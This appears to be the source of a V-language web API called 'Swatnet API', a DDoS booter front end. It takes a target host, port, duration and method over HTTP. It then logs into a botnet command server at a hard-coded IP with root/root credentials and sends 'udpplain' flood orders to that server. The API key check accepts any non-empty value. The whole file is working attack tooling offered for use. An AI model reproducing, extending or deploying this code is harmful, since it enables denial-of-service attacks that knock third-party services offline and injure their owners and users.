module api

import vweb
import net
import time

struct App {
	vweb.Context
}

pub fn attack(host string, port string, time string, method string) {
	mut conn := net.dial_tcp("46.31.77.155:552") or {
		panic("Failed to connect to Botnet!")
		return
	}
	conn.write_string("root\n") or {0}
	time.sleep(1*time.second)
	conn.write_string("root\n") or {0}

	match method {
		"udpplain" {
			conn.write_string("udpplain $host $port $time")
		}
	}
}

pub fn (mut app App) index() vweb.Result {
	return app.text("Swatnet API")
}

pub fn (mut app App) api() vweb.Result {
	key := app.query['key']
	host := app.query['host']
	port := app.query['port']
	time := app.query['time']
	method := app.query['method']

	if key == "" || host == "" || port == "" || time == "" || method == "" {
		return app.text("Error, Pelase fill all the parameter!")
	}

	attack(host, port, time, method)
	return app.text("Attack sent to ${host}:${port} for ${time} seconds with ${method}!")
}

pub fn start_api() {
	vweb.run(&App{}, 80)
}

